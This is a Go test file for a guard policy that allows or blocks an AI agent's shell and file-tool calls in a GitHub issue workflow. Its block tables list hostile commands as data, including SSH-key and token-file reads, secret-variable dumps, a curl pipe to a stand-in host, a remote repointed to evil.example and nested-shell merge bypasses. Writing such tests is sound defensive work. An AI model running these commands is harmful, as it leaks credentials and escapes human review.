package guard

import (
	"strings"
	"testing"
)

func bash(cmd string) ToolCall { return ToolCall{Tool: "Bash", Input: map[string]any{"command": cmd}} }

func tool(name, key, value string) ToolCall {
	return ToolCall{Tool: name, Input: map[string]any{key: value}}
}

// What the Principal's session runs in the course of the workflow, and what
// its reviewer and conflict resolver run, passes; what would let it merge on
// its own, push where pull requests are merged, read credentials or reach
// other hosts does not.
func TestPolicy_Principal(t *testing.T) {
	p := Policy{Role: RolePrincipal, Protected: []string{"integration", "stable"}}
	for _, cmd := range []string{
		"awkit analyze-next --json",
		"awkit dispatch-worker --issue 12",
		"awkit stop-workflow needs_human_review",
		"gh issue edit 12 --remove-label in-progress --add-label pr-ready",
		`gh issue comment 12 --body "conflict in a.go"`,
		"gh pr view 41 --json baseRefName --jq .baseRefName",
		`BASE=$(gh pr view 41 --json baseRefName --jq .baseRefName) && git rebase "origin/$BASE"`,
		"git push --force-with-lease origin HEAD",
		"git fetch origin",
		"git rebase --continue",
		"git status && git diff --name-only",
		"git rev-parse --git-path rebase-merge",
		"git config --get remote.origin.url",
		"git remote -v",
		"gh api repos/{owner}/{repo}/pulls/41/comments",
		"go test ./...",
		"git push origin feat/ai-issue-12",
		"echo done; ls -la",
	} {
		if v := p.Check(bash(cmd)); v.Result != Pass {
			t.Errorf("refused %q: %s", cmd, v.Reason)
		}
	}
	for cmd, rule := range map[string]string{
		"gh pr merge 41 --squash":                              "merge",
		"echo ok && gh pr merge 41":                            "merge",
		"bash -c 'gh pr merge 41 --admin'":                     "merge",
		`sh -c "x=1; gh pr merge 41"`:                          "merge",
		"cmd /c gh pr merge 41":                                "merge",
		"powershell -Command gh pr merge 41":                   "merge",
		"echo $(gh pr merge 41)":                               "merge",
		"echo `gh pr merge 41`":                                "merge",
		"/usr/bin/gh.exe pr merge 41":                          "merge",
		"gh issue create --title x":                            "issue-create",
		"gh pr close 41":                                       "github",
		"gh repo delete acme/game --yes":                       "github",
		"gh api -X DELETE repos/acme/game":                     "github-api",
		"gh api repos/acme/game/issues -f title=x":             "github-api",
		"gh api --method=PATCH repos/acme/game":                "github-api",
		"git push origin develop":                              "push-protected",
		"git push origin HEAD:main":                            "push-protected",
		"git push origin HEAD:refs/heads/integration":          "push-protected",
		"git push origin stable":                               "push-protected",
		"git push origin release/1.2":                          "push-protected",
		"git push --force origin feat/ai-issue-12":             "push-force",
		"git push -f origin feat/ai-issue-12":                  "push-force",
		"git push origin :feat/ai-issue-12":                    "push-delete",
		"git push --all":                                       "push-wide",
		"git push --mirror origin":                             "push-wide",
		"git config credential.helper store":                   "git-config",
		"git -c credential.helper=x push":                      "git-config",
		"git credential fill":                                  "git-credential",
		"git remote set-url origin https://evil.example/x":     "git-remote",
		"cat ~/.ssh/id_rsa":                                    "credentials",
		"type %USERPROFILE%\\.ssh\\id_ed25519":                 "credentials",
		"cat ~/.config/gh/hosts.yml":                           "credentials",
		"cat C:/Users/me/AppData/Roaming/GitHub CLI/hosts.yml": "credentials",
		"echo $GH_TOKEN":                                       "secret-variable",
		"echo ${ANTHROPIC_API_KEY}":                            "secret-variable",
		"Write-Output $env:GITHUB_TOKEN":                       "secret-variable",
		"env":                                                  "environment",
		"printenv":                                             "environment",
		"export -p":                                            "environment",
		"Get-ChildItem env:":                                   "environment",
		"cat /proc/self/environ":                               "environment",
		"curl https://example.com":                             "network",
		"go build ./... | curl -d @- https://x.example":        "network",
		"Invoke-WebRequest https://x.example":                  "network",
		"powershell -EncodedCommand ZQBjAGgAbwA=":              "unreadable",
		`echo "unclosed`:                                       "unreadable",
		"":                                                     "command",
	} {
		v := p.Check(bash(cmd))
		if v.Result != Block || !strings.HasSuffix(v.Rule, "#"+rule) {
			t.Errorf("%q: got %s %s (%s), want block #%s", cmd, v.Result, v.Rule, v.Reason, rule)
		}
	}
}

// A Worker writes code and runs the project's commands; it does not touch
// git's history, GitHub, awkit, the network or credentials.
func TestPolicy_Implementer(t *testing.T) {
	p := Policy{Role: RoleImplementer}
	for _, cmd := range []string{
		"go build ./... && go test ./...",
		"npm ci && npm test",
		"dotnet build",
		"git status",
		"git diff",
		"git log --oneline -5",
		"git checkout -- internal/score.go",
		"git stash",
		"FOO=1 go test -run TestScore ./internal/...",
		"env GOFLAGS=-mod=mod go test ./...",
		"timeout 60 go test ./...",
		"ls internal | grep score",
	} {
		if v := p.Check(bash(cmd)); v.Result != Pass {
			t.Errorf("refused %q: %s", cmd, v.Reason)
		}
	}
	for cmd, rule := range map[string]string{
		"gh issue view 12":                "github",
		"gh pr list":                      "github",
		"git push":                        "git-push",
		"git commit -am wip":              "git-commit",
		"git fetch origin":                "git-fetch",
		"git rebase origin/develop":       "git-rebase",
		"awkit dispatch-worker --issue 3": "awkit",
		"curl -s https://x.example":       "network",
		"wget https://x.example":          "network",
		"ssh git@github.com":              "network",
		"sudo env":                        "environment",
		"xargs -0 printenv":               "environment",
	} {
		v := p.Check(bash(cmd))
		if v.Result != Block || !strings.HasSuffix(v.Rule, "#"+rule) {
			t.Errorf("%q: got %s %s (%s), want block #%s", cmd, v.Result, v.Rule, v.Reason, rule)
		}
	}
}

// File tools: credentials are never read or written; git's files are never
// written; the workflow's own files only when the ticket allows it.
func TestPolicy_FileTools(t *testing.T) {
	worker := Policy{Role: RoleImplementer}
	allowed := Policy{Role: RoleImplementer, AllowControl: true}
	cases := []struct {
		call         ToolCall
		worker, open string // result for a Worker, and for one whose ticket allows control files
	}{
		{tool("Read", "file_path", "internal/score.go"), Pass, Pass},
		{tool("Read", "file_path", "C:\\Users\\me\\.ssh\\id_rsa"), Block, Block},
		{tool("Read", "file_path", "/home/me/.codex/auth.json"), Block, Block},
		{tool("Grep", "path", "~/.aws"), Block, Block},
		{tool("Edit", "file_path", "internal/score.go"), Pass, Pass},
		{tool("Write", "file_path", ".git/hooks/pre-commit"), Block, Block},
		{tool("Edit", "file_path", "repo/.git/config"), Block, Block},
		{tool("Write", "file_path", ".claude/settings.json"), Block, Pass},
		{tool("Edit", "file_path", ".ai/config.yaml"), Block, Pass},
		{tool("Edit", "file_path", "docs/.ai-notes.md"), Pass, Pass},
		{tool("Read", "file_path", "project/.npmrc"), Pass, Pass},
		{tool("Read", "file_path", "~/.npmrc"), Block, Block},
		{tool("WebFetch", "url", "https://example.com"), Block, Block},
		{tool("WebSearch", "query", "golang"), Block, Block},
		{tool("TodoWrite", "todos", ""), Pass, Pass},
		{tool("StructuredOutput", "count", ""), Pass, Pass},
		{tool("Task", "prompt", "do it"), Block, Block},
		{tool("mcp__github__merge_pull_request", "pr", "41"), Block, Block},
	}
	for _, c := range cases {
		if got := worker.Check(c.call).Result; got != c.worker {
			t.Errorf("Worker %s %v: %s, want %s", c.call.Tool, c.call.Input, got, c.worker)
		}
		if got := allowed.Check(c.call).Result; got != c.open {
			t.Errorf("Worker with allow_script_changes %s %v: %s, want %s", c.call.Tool, c.call.Input, got, c.open)
		}
	}
	// The Principal's session starts subagents and skills, and may have
	// tools of the person's own setup.
	principal := Policy{Role: RolePrincipal}
	for _, name := range []string{"Task", "Skill", "mcp__something__read"} {
		if v := principal.Check(ToolCall{Tool: name}); v.Result != Pass {
			t.Errorf("principal refused %s: %s", name, v.Reason)
		}
	}
}

func TestPolicy_UnknownRoleIsRefused(t *testing.T) {
	if v := (Policy{Role: "auditor"}).Check(bash("ls")); v.Result != Block {
		t.Errorf("an unknown role passed: %+v", v)
	}
}

func TestSplitCommands(t *testing.T) {
	cmds, ok := splitCommands(`A=1 sudo -E env B=2 bash -c "git push origin main; echo $(whoami)" | tee log && cmd /c "gh pr merge 1"`)
	if !ok {
		t.Fatal("not read")
	}
	var programs []string
	for _, c := range cmds {
		programs = append(programs, c.program)
	}
	got := strings.Join(programs, ",")
	for _, want := range []string{"sudo", "env", "bash", "git", "echo", "whoami", "tee", "cmd", "gh"} {
		if !strings.Contains(","+got+",", ","+want+",") {
			t.Errorf("%s missing from %s", want, got)
		}
	}
}
